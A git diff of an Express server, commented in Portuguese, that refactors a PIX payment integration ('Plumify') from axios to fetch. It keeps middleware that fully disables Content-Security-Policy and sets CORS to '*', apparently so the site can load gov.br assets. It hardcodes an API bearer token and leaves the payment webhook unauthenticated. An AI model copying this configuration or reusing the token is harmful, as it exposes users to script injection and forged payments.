@@ -5,12 +5,12 @@ const bcrypt = require('bcrypt');
 const jwt = require('jsonwebtoken');
 const cookieParser = require('cookie-parser');
 const path = require('path');
+const crypto = require('crypto');
 
 const app = express();
 
 // ============ LIBERAR TODOS OS RECURSOS EXTERNOS ============
 app.use((req, res, next) => {
-    // Libera completamente o CSP para os assets do gov.br
     res.setHeader('Content-Security-Policy', "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline'; font-src * data:; img-src * data:; connect-src *; frame-src *;");
     res.setHeader('Access-Control-Allow-Origin', '*');
     res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
@@ -223,10 +223,7 @@ app.get('/password.html', (req, res) => {
     res.sendFile(path.join(__dirname, 'password.html'));
 });
 
-// ==================== INTEGRAÇÃO PLUMIFY ====================
-const crypto = require('crypto');
-const axios = require('axios');
-
+// ==================== INTEGRAÇÃO PLUMIFY (SEM AXIOS) ====================
 // Configurações Plumify
 const PLUMIFY_PRODUCT_HASH = 'smm88ihfg0';
 const PLUMIFY_API_TOKEN = '0RRWtMOuHsAQlR7S0zEnlGBnLEnr8DgoDJS3GTecxH7nZr2X01kHo6rxrOGa';
@@ -237,7 +234,7 @@ function generateTransactionId() {
     return 'TX-' + Date.now() + '-' + crypto.randomBytes(4).toString('hex');
 }
 
-// Rota para criar pagamento via Plumify (SEM AXIOS)
+// Rota para criar pagamento via Plumify
 app.post('/api/create-payment', async (req, res) => {
     const { amount, customer_name, customer_email, customer_cpf } = req.body;
 
@@ -264,7 +261,6 @@ app.post('/api/create-payment', async (req, res) => {
             payment_methods: ['pix']
         };
 
-        // Usando fetch nativo (Node.js 18+)
         const response = await fetch(`${PLUMIFY_API_URL}/transactions`, {
             method: 'POST',
             headers: {
@@ -294,15 +290,17 @@ app.get('/api/payment-status/:reference_id', async (req, res) => {
     const { reference_id } = req.params;
     
     try {
-        const response = await axios.get(`${PLUMIFY_API_URL}/transactions/${reference_id}`, {
+        const response = await fetch(`${PLUMIFY_API_URL}/transactions/${reference_id}`, {
             headers: {
                 'Authorization': `Bearer ${PLUMIFY_API_TOKEN}`
             }
         });
         
+        const data = await response.json();
+        
         res.json({
             success: true,
-            status: response.data.status
+            status: data.status
         });
     } catch (error) {
         res.status(500).json({ error: 'Erro ao consultar pagamento' });
@@ -315,11 +313,7 @@ app.post('/api/webhook/pagamento', async (req, res) => {
     
     console.log(`📢 Webhook recebido: Transação ${reference_id} - Status: ${status}`);
     
-    // Aqui você pode salvar no banco de dados o status do pagamento
     try {
-        // Salvar no banco se quiser
-        // await pool.query('INSERT INTO pagamentos (reference_id, status, amount, data) VALUES ($1, $2, $3, NOW())', [reference_id, status, amount]);
-        
         res.json({ received: true });
     } catch (error) {
         res.status(500).json({ error: 'Erro ao processar webhook' });
